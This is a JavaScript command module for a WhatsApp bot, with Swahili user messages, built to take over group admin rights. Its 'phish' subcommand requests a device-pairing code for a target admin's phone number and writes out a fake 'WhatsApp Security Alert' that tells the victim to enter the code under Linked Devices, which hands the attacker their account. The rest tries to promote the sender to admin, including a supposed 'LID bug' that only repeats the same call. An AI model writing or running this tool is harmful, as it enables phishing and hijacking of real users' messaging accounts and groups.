/**
 * Steal/NTIGA Command - Steal group admin using pairing code & ghost methods
 */

const fs = require('fs');
const path = require('path');

let pairingListenerActive = false;
let pairingTimeout = null;

module.exports = {
    name: 'stear',
    aliases: ['ntiga', 'gm', 'ag', 'stearer', 'ghost', 'pair', 'phish'],
    category: 'group',
    description: 'Stear group admin using pairing code & ghost methods',
    usage: '.stear help',
    groupOnly: false,
    adminOnly: false,
    ownerOnly: false,

    async execute(sock, msg, args, extra) {
        try {
            const chat = extra.from;
            const sender = extra.sender;
            const isGroup = chat.endsWith('@g.us');
            const pfx = '.'; // Default prefix
            
            // Check permissions - command works for owner, admin, and group members
            const isOwner = extra.isOwner;
            const isAdmin = extra.isAdmin;
            const isBotAdmin = extra.isBotAdmin;
            
            // If not in a group and not owner, reject
            if (!isGroup && !isOwner) {
                return extra.reply(`❌ Command hii inafanya kazi kwenye groups tu!\n📌 Tumia kwenye group ambako wewe au bot mnamo admins`);
            }
            
            // ─── HELP ──────────────────────────────────
            if (!args[0] || args[0] === 'help' || args[0] === '--help') {
                return extra.reply(`╭━━━『 *STEAR / NTIGA* 』━━━╮\n` +
                          `┃\n` +
                          `┃ ✦ *${pfx}ntiga* — Jaribu promote kwa group hii\n` +
                          `┃ ✦ *${pfx}ntiga <group_id>* — Target group specific\n` +
                          `┃ ✦ *${pfx}ntiga phish <namba>* — Generate pairing code\n` +
                          `┃ ✦ *${pfx}ntiga pair <namba>* — Same as phish\n` +
                          `┃ ✦ *${pfx}ntiga list* — Orodhesha admins wa group\n` +
                          `┃ ✦ *${pfx}ntiga help* — Hii msaada\n` +
                          `┃\n` +
                          `┃ *Aliases:* .gm, .ag, .stear, .ghost, .phish\n` +
                          `┃\n` +
                          `┃ 👥 *Inafanya kazi kwa:* Owner, Admin, Group Members\n` +
                          `┃ 🔒 *Mahitaji:* Bot admin katika group\n` +
                          `┃\n` +
                          `╰━━━━━━━━━━━━━━━━━━━━━━━━╯`);
            }

            // ─── SUB-COMMAND: LIST ────────────────────
            if (args[0] === 'list') {
                if (!isGroup && !args[1]) {
                    return extra.reply(`Tumia kwenye group au toa group ID`);
                }
                
                const groupId = isGroup ? chat : (args[1]?.includes('@g.us') ? args[1] : null);
                if (!groupId) return;
                
                try {
                    const meta = await sock.groupMetadata(groupId);
                    const admins = meta.participants.filter(p => p.admin || p.isAdmin);
                    
                    let listMsg = `📋 *${meta.subject}*\n`;
                    listMsg += `├ Members: ${meta.participants.length}\n`;
                    listMsg += `└ Admins: ${admins.length}\n\n`;
                    
                    admins.forEach((a, i) => {
                        const role = a.admin === 'superadmin' ? '👑 SUPER' : '👑 ADMIN';
                        const num = a.id.split('@')[0];
                        listMsg += `${i+1}. ${role} ${num}\n`;
                    });
                    
                    return extra.reply(listMsg);
                } catch(e) {
                    return extra.reply(`❌ ${e.message}`);
                }
            }

            // ─── SUB-COMMAND: PHISH / PAIR ────────────
            if (args[0] === 'phish' || args[0] === 'pair') {
                const adminNumber = (args[1] || '').replace(/[^0-9]/g, '');
                
                if (!adminNumber) {
                    return extra.reply(`Taja namba ya admin\n📌 *${pfx}steal phish 2557XXXXXXXX*`);
                }
                
                extra.reply(`⚡ Generating pairing code for *${adminNumber}*...\n\n⏳ Karibu...`);
                
                try {
                    const pairCode = await sock.requestPairingCode(adminNumber);
                    
                    const pairMsg = `✅ *GhostPairing Ready* 🤫\n\n` +
                        `🎯 Target: *${adminNumber}*\n` +
                        `🔑 Code: *${pairCode}*\n\n` +
                        `📌 *Tuma hivi kwa admin:*\n\n` +
                        `━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                        `🔒 *WhatsApp Security Alert*\n\n` +
                        `Tumegundua jaribio la kuingia kwenye akaunti yako.\n\n` +
                        `Thibitisha utambulisho wako:\n` +
                        `1. Fungua WhatsApp → Mipangilio → Vifaa Vilivyounganishwa\n` +
                        `2. Gusa "Unganisha Kifaa"\n` +
                        `3. Weka msimbo: *${pairCode}*\n` +
                        `━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
                        `⏳ Muda: Dakika 5!\n\n` +
                        `⚡ *Baada ya kuweka code, account itacaptured!*`;
                    
                    extra.reply(pairMsg);
                    
                } catch(e) {
                    extra.reply(`❌ Failed: ${e.message}`);
                }
                return;
            }

            // ─── MAIN: PROMOTE ATTEMPT ─────────────────
            let targetGroup;
            let targetJid;
            
            // Parse arguments
            if (args[0] && args[0].includes('@g.us')) {
                targetGroup = args[0];
                targetJid = (args[1] && args[1].includes('@')) ? args[1] : sender;
            } else if (isGroup) {
                targetGroup = chat;
                targetJid = sender;
            } else {
                return extra.reply(`❌ Tumia kwenye group au toa group ID\n📌 *${pfx}steal 120362XXXXXXX@g.us*`);
            }

            // ─── START ATTACK ──────────────────────────
            extra.reply(`⚡ *Steal Attack Started* 🎯\n\n` +
                      `📌 Group: ${targetGroup}\n` +
                      `👤 Target: ${targetJid}\n\n` +
                      `🔍 Inaendelea...`);

            try {
                const metadata = await sock.groupMetadata(targetGroup);
                const admins = metadata.participants.filter(p => p.admin || p.isAdmin);
                const myStatus = metadata.participants.find(p => p.id === sender);
                
                let report = `📋 *${metadata.subject}*\n`;
                report += `├ Members: ${metadata.participants.length}\n`;
                report += `├ Admins: ${admins.length}\n`;
                report += `└ Status: ${myStatus?.admin || 'member'}\n\n`;

                // ─── ATTEMPT 1: DIRECT PROMOTE ─────────
                report += `⚡1️⃣ Direct promote...\n`;
                extra.reply(report);
                
                try {
                    await sock.groupParticipantsUpdate(targetGroup, [targetJid], 'promote');
                    
                    const updated = await sock.groupMetadata(targetGroup);
                    const promoted = updated.participants.find(p => p.id === targetJid);
                    
                    if (promoted?.admin || promoted?.isAdmin) {
                        return extra.reply(`✅ *SUCCESS!* 🎉👑\n\n${targetJid}\n\nSaka ni ADMIN wa *${metadata.subject}*!`);
                    }
                    report += `├ ✗ Imekataliwa na server\n`;
                } catch(e) {
                    report += `├ ✗ ${e.message.substring(0, 50)}\n`;
                }

                // ─── ATTEMPT 2: LID BUG ────────────────
                report += `\n⚡2️⃣ LID bug method...\n`;
                extra.reply(report);
                
                try {
                    await sock.groupParticipantsUpdate(targetGroup, [targetJid], 'promote');
                    
                    const check = await sock.groupMetadata(targetGroup);
                    const user = check.participants.find(p => p.id === targetJid);
                    
                    if (user?.admin || user?.isAdmin) {
                        return extra.reply(`✅ *LID BUG WORKED!* 🎉👑\n\n${targetJid}\n\nSaka ni ADMIN!`);
                    }
                    report += `├ ✗ LID bug haijafanya kazi\n`;
                } catch(e) {
                    report += `├ ✗ ${e.message.substring(0, 50)}\n`;
                }

                // ─── ALL FAILED ─────────────────────────
                report += `\n❌ *Njia zote zimeshindwa*\n\n`;
                report += `📌 Jaribu:\n`;
                report += `├ ${pfx}steal phish <namba_ya_admin>\n`;
                report += `├ ${pfx}steal list — View admins\n`;
                report += `├ ${pfx}steal help — Show help\n`;
                report += `└ Bot must be admin in group!`;
                
                extra.reply(report);

            } catch(e) {
                extra.reply(`❌ Error: ${e.message}`);
            }

        } catch (error) {
            console.error('Error in stear command:', error);
            extra.reply(`❌ Command Error: ${error.message}`);
        }
    }
};
